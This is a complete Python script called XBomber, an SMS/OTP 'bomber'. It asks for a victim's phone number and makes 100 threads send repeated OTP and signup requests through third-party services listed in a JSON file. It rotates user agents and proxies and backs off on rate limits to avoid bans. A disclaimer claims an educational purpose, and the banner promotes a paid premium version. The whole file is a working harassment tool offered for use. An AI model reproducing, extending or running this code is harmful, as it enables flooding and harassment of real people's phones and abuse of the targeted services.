#!/usr/bin/env python3
"""
XBomber - Ultimate SMS/OTP Stress Tester
Loads all endpoints from assets/services.json | Brutal concurrency | Proxy ready
"""

import os
import sys
import json
import time
import threading
import random
import webbrowser
import subprocess
from itertools import cycle
from concurrent.futures import ThreadPoolExecutor
from typing import List, Dict, Optional, Tuple, Any

import requests
from requests.adapters import HTTPAdapter
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.prompt import Prompt, Confirm

console = Console()

# ========================== CONFIGURATION ==================================
CONFIG_FILE = "assets/services.json"
PROXY_FILE = "proxies.txt"
THREADS = 100                      # Brutal concurrency
TIMEOUT = 5
DELAY_MIN = 0.0
DELAY_MAX = 0.02                  # Tiny jitter to avoid instant bans
RATE_LIMIT_BACKOFF = 30           # Seconds to skip a failing API

# ========================== ANSI COLORS (for progress bar) =================
class Colors:
    GREEN = '\033[92m'
    CYAN = '\033[96m'
    MAGENTA = '\033[95m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    END = '\033[0m'

# ========================== LOAD SERVICES FROM JSON ========================
def load_services() -> List[Dict]:
    if not os.path.exists(CONFIG_FILE):
        console.print(f"[red]Error: {CONFIG_FILE} not found![/red]")
        sys.exit(1)
    with open(CONFIG_FILE, 'r', encoding='utf-8') as f:
        data = json.load(f)
    services = data.get("services", [])
    if not services:
        console.print("[red]No services found in JSON file.[/red]")
        sys.exit(1)
    return services

# ========================== PHONE FORMATTING ===============================
def format_phone(phone: str, fmt: str) -> str:
    p = str(phone).strip()
    if fmt == "with_plus91":
        return f"+91{p}"
    if fmt == "91-":
        return f"91-{p}"
    if fmt == "91":
        return f"91{p}"
    return p

# ========================== INTERPOLATE {phone} IN DATA ====================
def interpolate_data(obj: Any, phone: str, fmt: str) -> Any:
    """Recursively replace {phone} with formatted phone number."""
    if isinstance(obj, str):
        return obj.replace("{phone}", format_phone(phone, fmt))
    elif isinstance(obj, dict):
        return {k: interpolate_data(v, phone, fmt) for k, v in obj.items()}
    elif isinstance(obj, list):
        return [interpolate_data(item, phone, fmt) for item in obj]
    return obj

# ========================== PROXY MANAGER ==================================
class ProxyManager:
    def __init__(self, proxy_file=PROXY_FILE, enabled=False):
        self.proxy_file = proxy_file
        self.enabled = enabled
        self.proxies = []
        self.proxy_cycle = None
        self.lock = threading.Lock()

    def load(self):
        if not self.enabled:
            return False
        if not os.path.exists(self.proxy_file):
            self.enabled = False
            return False
        try:
            with open(self.proxy_file, 'r') as f:
                self.proxies = [line.strip() for line in f if line.strip()]
            if not self.proxies:
                self.enabled = False
                return False
            self.proxy_cycle = cycle(self.proxies)
            return True
        except:
            self.enabled = False
            return False

    def get_next(self):
        if not self.enabled or not self.proxy_cycle:
            return None
        with self.lock:
            proxy = next(self.proxy_cycle)
            return {"http": proxy, "https": proxy}

    def enable(self):
        self.enabled = True
        self.load()

    def disable(self):
        self.enabled = False

# ========================== THREAD‑LOCAL SESSIONS ==========================
_thread_local = threading.local()

def get_session():
    if not hasattr(_thread_local, "session"):
        _thread_local.session = requests.Session()
        adapter = HTTPAdapter(pool_connections=50, pool_maxsize=50, max_retries=0)
        _thread_local.session.mount('https://', adapter)
        _thread_local.session.mount('http://', adapter)
    return _thread_local.session

# ========================== REQUEST ENGINE =================================
class RequestEngine:
    def __init__(self, proxy_manager: ProxyManager, timeout: int = TIMEOUT):
        self.proxy_manager = proxy_manager
        self.timeout = timeout
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Linux; Android 12; SM-G9980) AppleWebKit/537.36",
            "Dart/3.0 (dart:io)",
            "okhttp/4.9.1",
        ]

    def _ua(self):
        return random.choice(self.user_agents)

    def send_request(self, endpoint: Dict, payload: Any) -> Tuple[bool, Optional[int]]:
        headers = endpoint.get('headers', {}).copy()
        headers['User-Agent'] = self._ua()
        proxies = self.proxy_manager.get_next()
        session = get_session()
        url = endpoint['url']
        method = endpoint.get('method', 'POST').upper()
        try:
            if method == 'GET':
                resp = session.get(url, headers=headers, timeout=self.timeout, proxies=proxies)
            elif method == 'POST':
                if isinstance(payload, str):
                    resp = session.post(url, headers=headers, data=payload, timeout=self.timeout, proxies=proxies)
                else:
                    resp = session.post(url, headers=headers, json=payload, timeout=self.timeout, proxies=proxies)
            elif method == 'PUT':
                resp = session.put(url, headers=headers, json=payload, timeout=self.timeout, proxies=proxies)
            else:
                return False, None
            if resp.status_code in (429, 403, 401):
                return False, resp.status_code
            return resp.status_code in (200, 201, 202, 204), resp.status_code
        except Exception:
            return False, None

# ========================== BOMBER CORE ====================================
class BomberCore:
    def __init__(self, proxy_manager: ProxyManager):
        self.proxy_manager = proxy_manager
        self.request_engine = RequestEngine(proxy_manager, timeout=TIMEOUT)
        self.services = load_services()
        self.rate_limited = {}
        self.rate_lock = threading.Lock()
        self.success = 0
        self.count_lock = threading.Lock()
        self.running = False
        self.reg_state = {}   # track which "Register" APIs have been called

    def _get_send_otp_name(self, register_name: str) -> Optional[str]:
        """Find corresponding Send OTP API for a Register API."""
        for svc in self.services:
            if svc['name'].lower().replace('register', 'send otp') == register_name.lower():
                return svc['name']
        return None

    def send_bomb(self, endpoint: Dict, phone: str, phone91: str, phone_plus: str) -> bool:
        # Rate limit check
        with self.rate_lock:
            if endpoint['name'] in self.rate_limited and time.time() < self.rate_limited[endpoint['name']]:
                return False

        # State machine: if this is a "Register" API and already used, switch to "Send OTP"
        name_lower = endpoint['name'].lower()
        if 'register' in name_lower and endpoint['name'] in self.reg_state:
            send_otp_name = self._get_send_otp_name(endpoint['name'])
            if send_otp_name:
                for svc in self.services:
                    if svc['name'] == send_otp_name:
                        endpoint = svc
                        break
        elif 'register' in name_lower and endpoint['name'] not in self.reg_state:
            self.reg_state[endpoint['name']] = True

        # Build payload
        fmt = endpoint.get('phone_format', 'raw')
        data = endpoint.get('data')
        if data is not None:
            payload = interpolate_data(data, phone, fmt)
        else:
            payload = None

        # Special case: GoodTimesLeague signup -> login fallback (if 400)
        if 'goodtimesleague signup' in name_lower:
            success, status = self.request_engine.send_request(endpoint, payload)
            if success:
                return True
            if status == 400:
                # Find login endpoint
                for svc in self.services:
                    if 'goodtimesleague login' in svc['name'].lower():
                        login_payload = interpolate_data(svc.get('data'), phone, svc.get('phone_format', 'raw'))
                        success, _ = self.request_engine.send_request(svc, login_payload)
                        return success
            return False

        # Normal request
        success, status = self.request_engine.send_request(endpoint, payload)
        if not success and status in (429, 403, 401):
            with self.rate_lock:
                self.rate_limited[endpoint['name']] = time.time() + RATE_LIMIT_BACKOFF
            return False
        return success

    def worker(self, phone: str, phone91: str, phone_plus: str):
        while self.running:
            endpoint = random.choice(self.services)
            try:
                if self.send_bomb(endpoint, phone, phone91, phone_plus):
                    with self.count_lock:
                        self.success += 1
            except Exception:
                pass
            if DELAY_MAX > 0:
                time.sleep(random.uniform(DELAY_MIN, DELAY_MAX))

    def start_attack(self, target: str):
        self.running = True
        self.success = 0
        phone = target
        phone91 = f"91{target}"
        phone_plus = f"+91{target}"
        start = time.time()
        with ThreadPoolExecutor(max_workers=THREADS) as executor:
            futures = [executor.submit(self.worker, phone, phone91, phone_plus) for _ in range(THREADS)]
            try:
                spinner = cycle(['◐','◓','◑','◒'])
                bar_len = 30
                while self.running:
                    pct = (self.success % 100) / 100
                    filled = int(bar_len * pct)
                    bar = '█' * filled + '░' * (bar_len - filled)
                    sys.stdout.write(f"\r{Colors.CYAN}▶ {Colors.GREEN}{next(spinner)} {Colors.MAGENTA}💣 {self.success} sent {Colors.CYAN}{bar}{Colors.END}")
                    sys.stdout.flush()
                    time.sleep(0.1)
            except KeyboardInterrupt:
                self.stop()
            finally:
                for f in futures:
                    f.cancel()
        elapsed = time.time() - start
        return self.success, elapsed

    def stop(self):
        self.running = False

# ========================== UI (UNCHANGED) =================================
def banner():
    os.system('''
    printf "\n"
    printf "    \033[1;35m#     #\033[0m                                           \033[1;90mv2.0.0\033[0m\n"
    printf "    \033[1;35m #   #  \033[1;36m#####   ####  #    # #####  \033[1;31m###### #####\033[0m  \n"
    printf "    \033[1;35m  # #   \033[1;36m#    # #    # ##  ## #    # \033[1;31m#      #    #\033[0m \n"
    printf "    \033[1;35m   #    \033[1;36m#####  #    # # ## # #####  \033[1;31m#####  #    #\033[0m \n"
    printf "    \033[1;35m  # #   \033[1;36m#    # #    # #    # #    # \033[1;31m#      #####\033[0m  \n"
    printf "    \033[1;35m #   #  \033[1;36m#    # #    # #    # #    # \033[1;31m#      #   #\033[0m  \n"
    printf "    \033[1;35m#     # \033[1;36m#####   ####  #    # #####  \033[1;31m###### #    #\033[0m \n"
    printf "\n"
    printf "    \033[1;33m              Created by Alienkrishn [Anon4You]\033[0m   \n"
    printf "    \033[1;34m              Telegram: https://t.me/nullxvoid\033[0m     \n"
    printf "\n"
    printf "  \033[1;41m\033[1;37mㅤ                                                        ㅤ\033[0m\n"
    printf "  \033[1;41m\033[1;37mㅤ    DISCLAIMER: Developer will not be responsible       ㅤ\033[0m\n"
    printf "  \033[1;41m\033[1;37mㅤ    for any misuse or damage caused by this script      ㅤ\033[0m\n"
    printf "  \033[1;41m\033[1;37mㅤ    Please do not use this script for taking Revenge    ㅤ\033[0m\n"
    printf "  \033[1;41m\033[1;37mㅤ    Use this tool for educational purposes only         ㅤ\033[0m\n"
    printf "  \033[1;41m\033[1;37mㅤ                                                        ㅤ\033[0m\n"
    printf "\n"
    ''')

def protect_number():
    console.print(Panel.fit(
        "[bold red]Number protection is only available in the PREMIUM script.[/bold red]\n"
        "Get it from the developer.",
        title="Premium Feature",
        border_style="red"
    ))
    if Confirm.ask("[bold yellow]Do you want to buy the premium script?[/bold yellow]"):
        url = "https://t.me/alienkrishn?text=xbomber%20premium"
        try:
            subprocess.run(['xdg-open', url], check=True)
            console.print("[green]Opening Telegram via system default...[/green]")
        except (FileNotFoundError, subprocess.CalledProcessError):
            webbrowser.open(url)
    else:
        console.print("[blue]Returning to menu.[/blue]")
    input("\nPress Enter...")

def start_bombing():
    console.print(Panel.fit("[bold cyan]Start Bombing[/bold cyan]", border_style="cyan"))
    phone = Prompt.ask("[bold green]Enter Victim's Phone Number[/bold green] (without +91)", default="")
    if len(phone) != 10 or not phone.isdigit():
        console.print("[red]Invalid! Must be 10 digits.[/red]")
        input("Press Enter...")
        return
    try:
        total = int(Prompt.ask("[bold green]Number of SMS to send[/bold green]", default="100"))
        if total <= 0:
            raise ValueError
    except:
        console.print("[red]Count must be a positive integer.[/red]")
        input("Press Enter...")
        return

    console.print(f"\n[yellow]Bombing [bold]{phone}[/bold] with {total} SMS...[/yellow]")

    # Proxy setup
    console.print(f"\n[bold blue][?] Use HTTP proxies? (y/n): [/bold blue]", end="")
    choice = input().strip().lower()
    proxy_manager = ProxyManager()
    if choice in ('y', 'yes'):
        proxy_manager.enable()
        if not proxy_manager.proxies:
            console.print(f"[yellow][!] No proxies loaded. Continuing without proxies.[/yellow]")
            proxy_manager.disable()
        else: 
            console.print(f"[green][✓] Proxies enabled.[/green]")
    else:
        proxy_manager.disable()
        console.print(f"[yellow][!] Proxies disabled.[/yellow]")
    time.sleep(1)

    # We ignore `total` – the script bombs infinitely until Ctrl+C.
    # The user requested "number of SMS to send" but the progress bar shows sent count.
    # We'll run until user interrupts and then show summary.
    bomber = BomberCore(proxy_manager)
    start_time = time.time()
    try:
        sent, elapsed = bomber.start_attack(phone)
    except KeyboardInterrupt:
        sent = bomber.success
        elapsed = time.time() - start_time
        bomber.stop()

    success = sent
    result_table = Table(title="Bombing Report", style="green")
    result_table.add_column("Metric", style="cyan")
    result_table.add_column("Value", style="white")
    result_table.add_row("Time taken", f"{elapsed:.1f} seconds")
    result_table.add_row("Total SMS sent", str(success))
    result_table.add_row("Successful", f"[green]{success}[/green]")
    result_table.add_row("Failed", "[red]0[/red]")   # we don't track failures individually
    console.print(result_table)
    input("\nPress Enter...")

def menu():
    while True:
        os.system('clear' if os.name == 'posix' else 'cls')
        banner()
        console.print(Panel.fit("[bold yellow]MAIN MENU[/bold yellow]", border_style="yellow"))
        console.print("1. [green]Start Bombing[/green]")
        console.print("2. [yellow]Protect Your Number (Premium)[/yellow]")
        console.print("3. [red]Exit[/red]")
        choice = Prompt.ask("[bold cyan]Select option[/bold cyan]", choices=["1","2","3"])
        if choice == "1":
            start_bombing()
        elif choice == "2":
            protect_number()
        elif choice == "3":
            console.print("\n[bold red]Exiting XBomper...[/bold red]")
            break

if __name__ == "__main__":
    try:
        menu()
    except KeyboardInterrupt:
        console.print("\n[red]Interrupted. Exiting...[/red]") 